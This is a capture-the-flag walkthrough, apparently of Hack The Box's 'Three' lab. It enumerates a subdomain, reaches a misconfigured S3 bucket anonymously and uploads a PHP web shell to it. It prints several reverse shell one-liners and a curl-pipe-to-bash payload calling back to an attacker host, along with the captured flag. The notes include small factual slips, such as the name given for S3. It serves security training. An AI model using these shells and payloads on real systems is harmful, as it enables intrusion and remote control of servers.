#cloud #aws #custom-applications #reconnaissance #web-site-structure-discovery #bucket-enumeration #arbitrry-file-upload #anonymous-access 

# 0. Theory

Organizations of every type, size, and industry are using the cloud for a wide variety of use cases, such as data backup, storage, disaster recovery, email, virtual desktops, software development and testing, etc.
A poorly configured AWS S3 bucket will be examined and exploited in this exercise, to have a reverse shell uploaded to it.

## What is a subdomain?
A subdomain name is a piece of additional information added to the beginning of a website’s domain name. It allows websites to separate and organize content for a specific function — such as a blog or an online store — from the rest of your website.

For example, if we visit hackthebox.com we can access the main website. Or, we can visit ctf.hackthebox.com to access the section of the website that is used for CTFs. In this case, ctf is the subdomain, hackthebox is the primary domain and com is the [top-level domain (TLD)](https://www.cloudflare.com/en-in/learning/dns/top-level-domain/). Although the URL changes slightly, you’re still on HTB's website, under HTB's domain.

Often, different subdomains will have different IP addresses, so when our system goes to look up the subdomain, it gets the address of the server that handles that application. It is also possible to have one server handle multiple subdomains. This is accomplished via "host-based routing", or "virtual host routing", where the server uses the Host header in the HTTP request to determine which application is meant to handle the request.

## What is an S3 bucket?

An Amazon **[Single Storage Service](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html)** (**S3**) is an object storage service that offers industry-leading scalability, data availability, security, and performance.
It is an object storage service that is basically a container. Every file on the container is considered an (S3) object.


**In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?**
*/etc/hosts*

**Which service is running on the discovered sub-domain?**
*Amazon S3*

**Which command line utility can be used to interact with the service running on the discovered sub-domain?**
*`awscli`*

**Which command is used to set up the AWS CLI installation?**
*`aws configure`*

**What is the command used by the above utility to list all of the S3 buckets?**
*`aws s3 ls`*



# 1. Recon

Verify target and availability.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ ping 10.129.227.248 -c 4
	PING 10.129.227.248 (10.129.227.248) 56(84) bytes of data.
	64 bytes from 10.129.227.248: icmp_seq=1 ttl=63 time=8.09 ms
	64 bytes from 10.129.227.248: icmp_seq=2 ttl=63 time=7.93 ms
	64 bytes from 10.129.227.248: icmp_seq=3 ttl=63 time=8.94 ms
	64 bytes from 10.129.227.248: icmp_seq=4 ttl=63 time=7.93 ms
	
	--- 10.129.227.248 ping statistics ---
	4 packets transmitted, 4 received, 0% packet loss, time 3004ms
	rtt min/avg/max/mdev = 7.925/8.218/8.935/0.418 ms


# 2. Enumeration

We start with a port scanning.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ nmap -sV 10.129.227.248
	Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 23:43 CDT
	Nmap scan report for 10.129.227.248
	Host is up (0.011s latency).
	Not shown: 998 closed tcp ports (reset)
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
	80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
	
	Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
	Nmap done: 1 IP address (1 host up) scanned in 6.69 seconds


We see two ports open: an `SSH` service running on open **port 22/TCP**  with the version `OpenSSH 7.6p1 Ubuntu 4ubuntu0.7`, and a `HTTP` service running on open **port 80/TCP** with the version of `Apache httpd 2.4.29`.

Checking the website in the browser shows up a static web page.

Let's try to identify the technology stack of the website further with a browser addon [Wappalyzer](https://www.wappalyzer.com/)
Another web tool we could use to determine the back-end language is [BuiltWith](https://builtwith.com/ "builtwith.com").

>Other methods to infer some information about the back-end technology stack:
>1. **Check HTTP Headers**:  
    - Use browser developer tools (F12) and navigate to the "Network" tab. Reload the page and look at the HTTP headers of the requests. Some headers may indicate the server type (e.g., `X-Powered-By` might show if the site uses PHP, ASP.NET, etc.).
>2. **View Page Source**:  
    - Right-click on the webpage and select "View Page Source." This will show you the HTML, CSS, and JavaScript, but not the back-end code. However, you might find comments or clues indicating the technology used.
>3. **Use Online Tools**:  
    - Websites like [BuiltWith](https://builtwith.com/ "builtwith.com") or [Wappalyzer](https://www.wappalyzer.com/ "www.wappalyzer.com") can analyze a site and provide information about the technologies used, including the back-end language.
    - Furthermore, tools like [whatweb](https://github.com/urbanadventurer/WhatWeb) and  webtech that can help with this. We have [wafw00f](https://github.com/EnableSecurity/wafw00f) to see if the application has a WAF (Web Application Firewall).
>1. **Look for Framework-Specific URLs**:  
    - Some frameworks have specific URL patterns or file extensions (e.g., `.php`, `.asp`, `.jsp`, etc.) that can hint at the back-end language.
>2. **Check for Common Files**:  
    - If you can access specific URLs (like `/admin`, `/api`, etc.), this might give clues about the framework or language used.

![[Pasted image 20240831135625.png]]

Although in this exercise's write-up the author proceeds with the enumeration step by Wappalyzer showing that the target site is built with PHP, at the time of doing this exercise, we cannot see it in the addon's list of used technologies found on the web page.

Neither checking the source code, nor checking the response headers give us a lead on what kind of language the website must have been written written with. At this point, a **dir busting** could potentially give us some lead.
In this case, however, we can leverage some common sense to try and see if the website has an index page that often gets generated by frameworks, by default.

When we try the `/index.html`, `/index.asp`, `/index.aspx`, and `/index.php` pages in the site's URL, we can see `404 Page Not Found` on the `html`, `asp` and `aspx` extensions.
For the /index.php page, however, we see that the same web page loads as usual. This hints at the fact that PHP was used on the back-end.

![[Pasted image 20240831140234.png]]

Some further information can be gathered about the target's technology stack by running `whatweb`.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ whatweb -a 3 10.129.227.248
	http://10.129.227.248 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[mail@thetoppers.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.227.248], Script, Title[The Toppers]


[More on Web Application Enumeration here.](https://medium.com/stolabs/web-application-enumeration-c23090dd66e7)


Now that we know that PHP is being used by the website, upon scrolling down the webpage, we come across the "Contact" section, which has email information. The email given here has the domain `thetoppers.htb`.

Let's add an entry for `thetoppers.htb` in the `/etc/hosts` file with the corresponding IP address to be able to access this domain in our browser.
The `/etc/hosts` file is used to resolve a hostname into an IP address. By default, the `/etc/hosts` file is queried before the DNS server for hostname resolution thus we will need to add an entry in the `/etc/hosts` file for this domain to enable the browser to resolve the address for `thetoppers.htb`.

	echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ echo "10.129.227.248 thetoppers.htb" | sudo tee -a /etc/hosts
	10.129.227.248 thetoppers.htb

## Sub-domain enumeration

As we have the domain `thetoppers.htb`, let's enumerate for any other sub-domains that may be present on the same server. There are different enumeration tools available for this purpose like `gobuster` , `wfuzz` , `feroxbuster` etc.

We will be using the following flags for gobuster:

	vhost : Uses VHOST for brute-forcing
	-w : Path to the wordlist
	-u : Specify the URL

`gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain`

>**Note:** If using Gobuster version `3.2.0` and above we also have to add the `--append-domain` flag to our command so that the enumeration takes into account the known vHost (`thetoppers.htb`) and appends it to the words found in the wordlist (`word.thetoppers.htb`)


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ gobuster vhost -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
	===============================================================
	Gobuster v3.6
	by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
	===============================================================
	[+] Url:             http://thetoppers.htb
	[+] Method:          GET
	[+] Threads:         10
	[+] Wordlist:        /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt
	[+] User Agent:      gobuster/3.6
	[+] Timeout:         10s
	[+] Append Domain:   true
	===============================================================
	Starting gobuster in VHOST enumeration mode
	===============================================================
	Found: s3.thetoppers.htb Status: 404 [Size: 21]
	Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
	Progress: 4989 / 4990 (99.98%)
	===============================================================
	Finished
	===============================================================



It found the sub-domain `s3.thetoppers.htb` for us.
Let's also add an entry for this sub-domain in the `/etc/hosts` file.

`echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts`

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts
	10.129.227.248 s3.thetoppers.htb


After this, when we visit the page in a browser, we see that it only contains the following JSON:

	{"status": "running"}

We can interact with this S3 bucket with the aid of the `awscli` utility. It can be installed on Linux using the following command:

`sudo apt install awscli`.

Before using it, first, we need to configure it using the `aws configure` command.

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ aws configure
	AWS Access Key ID [None]: temp 
	AWS Secret Access Key [None]: temp
	Default region name [None]: temp
	Default output format [None]: temp

We can list all of the S3 buckets hosted by the server by using the `ls` command.
Then, the same `ls` command to list all objects and common prefixes under the specified bucket.

`aws --endpoint=http://s3.thetoppers.htb s3 ls`
`aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb`


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ aws --endpoint=http://s3.thetoppers.htb s3 ls
	2024-08-31 06:24:33 thetoppers.htb
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
	                           PRE images/
	2024-08-31 06:24:33          0 .htaccess
	2024-08-31 06:24:33      11952 index.php


We see the files `index.php`, `.htaccess` and a directory called `images` in the specified bucket. It seems like this is the webroot of the website running on **port 80** . So the Apache server is using this S3 bucket as storage.

### Remote Code Execution (Backdoor)

[Detailed article on PHP backdoor exploit here.](https://secure.wphackedhelp.com/blog/web-shell-php-exploit/)

`awscli` has got another feature that allows us to copy files to a remote bucket. We already know that the website is using PHP. Thus, we can try uploading a PHP shell file to the `S3` bucket and since it's uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and **we will achieve remote code execution**.

## Reverse Shell with PHP

The steps of establishing a reverse shell connection in general:
1. Set up `netcat` listening on some port on the attacker machine.
2. Create a script that fires up a `netcat` command parametrized to offer a shell to the attacker IP address on the specified port. Get the target to run that script while attacker is listening with `netcat`.
   *(`nc -e /bin/bash <atacker's IP> <port>` for unix, where `-e /bin/bash` is possibly only available on Kali)*

We can use the following PHP one-liner which uses the `system()` function which takes the URL parameter `cmd` as an input, using the [`$_GET` php associative array of variables](https://www.php.net/manual/en/reserved.variables.get.php), and executes it as a system command:

`<?php system($_GET["cmd"]); ?>`

To create a PHP file to upload:

`echo '<?php system($_GET["cmd"]); ?>' > shell.php`
or
```
echo '<?php `$_GET["cmd"]` ?>' > shell.php
```

Then, we can upload that `shell.php` to the `thetoppers.htb` S3 bucket using the following command:

`aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb`

After this, the /shell.php page will be available by `http://<target IP>/shell.php`, and the URL argument "cmd" can be specified as usual:
`http://<target IP>/shell.php?cmd=<command to execute>`


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ ls 
	cacert.der  Documents  Music    Pictures  shell.php  Videos
	Desktop     Downloads  my_data  Public    Templates
	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.26]─[scrage@htb-04ijrv9nft]─[~]
	└──╼ [★]$ aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
	upload: ./shell.php to s3://thetoppers.htb/shell.php


We can confirm that our shell is uploaded by navigating to http://thetoppers.htb/shell.php. Let us try executing the OS command `id` using the URL parameter `cmd`.

> **Note:** the target IP address has been changed at this point due to restarting the exercise and the target host.

![[Pasted image 20240901131816.png]]

The response from the server contains the output of the OS command `id` , which verified that we have code execution on the box. So, let's try to obtain a reverse shell now.


## Other PHP reverse shell solutions

`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1'");?>`
or
`<?php exec("/bin/bash -c 'bash -i > /dev/tcp/ATTACKING-IP/1234 0>&1'");`
or
`php -r '$sock=fsockopen("<ip>",<port>);exec("sh <&3 >&3 2>&3");'`

The PHP reverse shell one-liner opens a TCP socket and connects it to the attacker's IP and port. It then executes a shell, redirecting the input, output, and error streams to the socket.
A listener is needed on the attacker side, waiting for a connection. Set it up with the attacker machine's IP and a chosen port number.


## Steps to setting up the reverse shell

Before we do anything, we check our attacker machine's `tun0` IP address by executing either `ifconfig` (legacy) or the `ip a` command:

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.32]─[scrage@htb-we0ubgl4p1]─[~]
	└──╼ [★]$ ifconfig
	[*** SNIP ***]
	
	tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
	        inet 10.10.14.32  netmask 255.255.254.0  destination 10.10.14.32
	        inet6 fe80::dfd0:b325:cc9d:440c  prefixlen 64  scopeid 0x20<link>
	        inet6 dead:beef:2::101e  prefixlen 64  scopeid 0x0<global>
	        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
	        RX packets 40373  bytes 44041665 (42.0 MiB)
	        RX errors 0  dropped 0  overruns 0  frame 0
	        TX packets 28072  bytes 2497419 (2.3 MiB)
	        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

Our IP address is `10.10.14.32` in this case.

**I. First,** Let's get a reverse shell by creating a new file `shell.sh` containing the following bash reverse shell payload which will connect back to our local machine on port `1337`:

```
#!/bin/bash
bash -i >& /dev/tcp/<ATTACKER'S IP ADDRESS>/1337 0>&1
```

**II. Second,** we will start a `ncat` listener on our local port `1337` using the following command:

`nc -nvlp 1337`

Netcat command flags:
- `l: to listen`
- `n: no DNS resolution, IP addresses only`
- `v: verbose`
- `p: port number, be specified right after the flag (best to keep it under 1000 to avoid firewall detection)`

**III. Third,** we will start a web server on our local machine on **port 8000** and host this bash file.
==It is crucial to note here== that this command for hosting the web server must be run from the directory which contains the reverse shell file. So, we must first traverse to the appropriate directory and then run the following command:

`python3 -m http.server 8000`

	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.32]─[scrage@htb-we0ubgl4p1]─[~/reverse_shell]
	└──╼ [★]$ python3 -m http.server 8000
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

**IV. Then,** we can use the `curl` utility to fetch the bash reverse shell file from our local host and then pipe it to `bash` in order to execute it. Thus, let us visit the following URL containing the payload in the browser:

`http://thetoppers.htb/shell.php?cmd=curl%20<ATTACKER'S_IP_ADDRESS>:8000/shell.sh|bash`

And after visiting the `/shell.php` page on the target website again, having the curl command passed as argument to execute, we then receive a reverse shell on the corresponding listening port on our machine:


	┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.32]─[scrage@htb-we0ubgl4p1]─[~]
	└──╼ [★]$ nc -nvlp 1337
	listening on [any] 1337 ...
	connect to [10.10.14.32] from (UNKNOWN) [10.129.216.181] 47650
	bash: cannot set terminal process group (1507): Inappropriate ioctl for device
	bash: no job control in this shell
	www-data@three:/var/www/html$

After sniffing around, we find the flag.txt under the `/var/www` folder:

	www-data@three:/var/www$ ls
	ls
	flag.txt
	html
	www-data@three:/var/www$ cat flag.txt
	cat flag.txt
	a980d99281a28d638ac68b9bf9453c2b



https://www.hackthebox.com/achievement/machine/2057492/489
![[Pasted image 20240901134959.png]]